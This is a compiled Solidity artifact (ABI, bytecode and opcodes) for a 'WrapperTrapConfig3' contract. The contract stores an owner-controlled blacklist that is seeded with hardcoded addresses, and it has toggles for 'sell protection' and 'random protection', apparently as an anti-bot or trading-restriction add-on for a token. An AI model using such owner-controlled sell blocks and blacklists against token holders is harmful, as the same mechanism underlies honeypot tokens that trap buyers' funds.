{
  "contracts/WrapperTrap3.sol": {
    "WrapperTrapConfig3": {
      "abi": [
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "_ad",
              "type": "address"
            }
          ],
          "name": "WrapperTrapConfig_addBL",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "WrapperTrapConfig_config",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "_ad",
              "type": "address"
            }
          ],
          "name": "WrapperTrapConfig_isBL",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "_ad",
              "type": "address"
            }
          ],
          "name": "WrapperTrapConfig_removeBL",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "bool",
              "name": "_sellProtection",
              "type": "bool"
            },
            {
              "internalType": "bool",
              "name": "_randomProtection",
              "type": "bool"
            }
          ],
          "name": "WrapperTrap_config",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ],
      "evm": {
        "bytecode": {
          "linkReferences": {},
          "object": "60a06040526000805461ffff191661010017905534801561001f57600080fd5b503260601b608052610044731be0f4b9bbf312fdc9dfedff50aedce6f5035d516100b9565b6100617359903993ae67bf48f10832e9be28935fee04d6f66100b9565b61007e736da4bea09c3aa0761b09b19837d9105a522543036100b9565b61009b73a3b0e79935815730d942a444a84d4bd14a3395536100b9565b6100b46fb7ca7e12dcc72290d1fe47b2ef14c6076100b9565b6100e0565b6001600160a01b03166000908152600160208190526040909120805460ff19169091179055565b60805160601c61025b6100fd600039806101d2525061025b6000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c80632d3d796a1461005c578063b976d62314610096578063cc695c48146100bf578063d557b948146100e2578063f11a33af14610108575b600080fd5b6100826004803603602081101561007257600080fd5b50356001600160a01b031661012e565b604080519115158252519081900360200190f35b6100bd600480360360408110156100ac57600080fd5b50803515159060200135151561014c565b005b6100c7610177565b60408051921515835290151560208301528051918290030190f35b6100bd600480360360208110156100f857600080fd5b50356001600160a01b031661018a565b6100bd6004803603602081101561011e57600080fd5b50356001600160a01b031661019e565b6001600160a01b031660009081526001602052604090205460ff1690565b6101546101c7565b6000805460ff19169215159290921761ff00191661010091151591909102179055565b60005460ff808216916101009004169091565b6101926101c7565b61019b816101fe565b50565b6101a66101c7565b6001600160a01b03166000908152600160205260409020805460ff19169055565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101fc57600080fd5b565b6001600160a01b03166000908152600160208190526040909120805460ff1916909117905556fea26469706673582212205a83187d9973b35fa8c545c41c504970796fb94ae93350e2429dfca40fbe081264736f6c63430007060033",
          "opcodes": "PUSH1 0xA0 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 SLOAD PUSH2 0xFFFF NOT AND PUSH2 0x100 OR SWAP1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x1F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP ORIGIN PUSH1 0x60 SHL PUSH1 0x80 MSTORE PUSH2 0x44 PUSH20 0x1BE0F4B9BBF312FDC9DFEDFF50AEDCE6F5035D51 PUSH2 0xB9 JUMP JUMPDEST PUSH2 0x61 PUSH20 0x59903993AE67BF48F10832E9BE28935FEE04D6F6 PUSH2 0xB9 JUMP JUMPDEST PUSH2 0x7E PUSH20 0x6DA4BEA09C3AA0761B09B19837D9105A52254303 PUSH2 0xB9 JUMP JUMPDEST PUSH2 0x9B PUSH20 0xA3B0E79935815730D942A444A84D4BD14A339553 PUSH2 0xB9 JUMP JUMPDEST PUSH2 0xB4 PUSH16 0xB7CA7E12DCC72290D1FE47B2EF14C607 PUSH2 0xB9 JUMP JUMPDEST PUSH2 0xE0 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 SWAP2 KECCAK256 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SWAP2 OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH1 0x60 SHR PUSH2 0x25B PUSH2 0xFD PUSH1 0x0 CODECOPY DUP1 PUSH2 0x1D2 MSTORE POP PUSH2 0x25B PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x57 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2D3D796A EQ PUSH2 0x5C JUMPI DUP1 PUSH4 0xB976D623 EQ PUSH2 0x96 JUMPI DUP1 PUSH4 0xCC695C48 EQ PUSH2 0xBF JUMPI DUP1 PUSH4 0xD557B948 EQ PUSH2 0xE2 JUMPI DUP1 PUSH4 0xF11A33AF EQ PUSH2 0x108 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x82 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x72 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x12E JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP2 ISZERO ISZERO DUP3 MSTORE MLOAD SWAP1 DUP2 SWAP1 SUB PUSH1 0x20 ADD SWAP1 RETURN JUMPDEST PUSH2 0xBD PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xAC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP DUP1 CALLDATALOAD ISZERO ISZERO SWAP1 PUSH1 0x20 ADD CALLDATALOAD ISZERO ISZERO PUSH2 0x14C JUMP JUMPDEST STOP JUMPDEST PUSH2 0xC7 PUSH2 0x177 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 ISZERO ISZERO DUP4 MSTORE SWAP1 ISZERO ISZERO PUSH1 0x20 DUP4 ADD MSTORE DUP1 MLOAD SWAP2 DUP3 SWAP1 SUB ADD SWAP1 RETURN JUMPDEST PUSH2 0xBD PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x18A JUMP JUMPDEST PUSH2 0xBD PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x11E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP CALLDATALOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH2 0x19E JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 SLOAD PUSH1 0xFF AND SWAP1 JUMP JUMPDEST PUSH2 0x154 PUSH2 0x1C7 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP3 ISZERO ISZERO SWAP3 SWAP1 SWAP3 OR PUSH2 0xFF00 NOT AND PUSH2 0x100 SWAP2 ISZERO ISZERO SWAP2 SWAP1 SWAP2 MUL OR SWAP1 SSTORE JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH1 0xFF DUP1 DUP3 AND SWAP2 PUSH2 0x100 SWAP1 DIV AND SWAP1 SWAP2 JUMP JUMPDEST PUSH2 0x192 PUSH2 0x1C7 JUMP JUMPDEST PUSH2 0x19B DUP2 PUSH2 0x1FE JUMP JUMPDEST POP JUMP JUMPDEST PUSH2 0x1A6 PUSH2 0x1C7 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 MSTORE PUSH1 0x40 SWAP1 KECCAK256 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SSTORE JUMP JUMPDEST CALLER PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB PUSH32 0x0 AND EQ PUSH2 0x1FC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST JUMP JUMPDEST PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x0 SWAP1 DUP2 MSTORE PUSH1 0x1 PUSH1 0x20 DUP2 SWAP1 MSTORE PUSH1 0x40 SWAP1 SWAP2 KECCAK256 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SWAP2 OR SWAP1 SSTORE JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GAS DUP4 XOR PUSH30 0x9973B35FA8C545C41C504970796FB94AE93350E2429DFCA40FBE08126473 PUSH16 0x6C634300070600330000000000000000 "
        },
        "methodIdentifiers": {
          "WrapperTrapConfig_addBL(address)": "d557b948",
          "WrapperTrapConfig_config()": "cc695c48",
          "WrapperTrapConfig_isBL(address)": "2d3d796a",
          "WrapperTrapConfig_removeBL(address)": "f11a33af",
          "WrapperTrap_config(bool,bool)": "b976d623"
        }
      }
    }
  }
}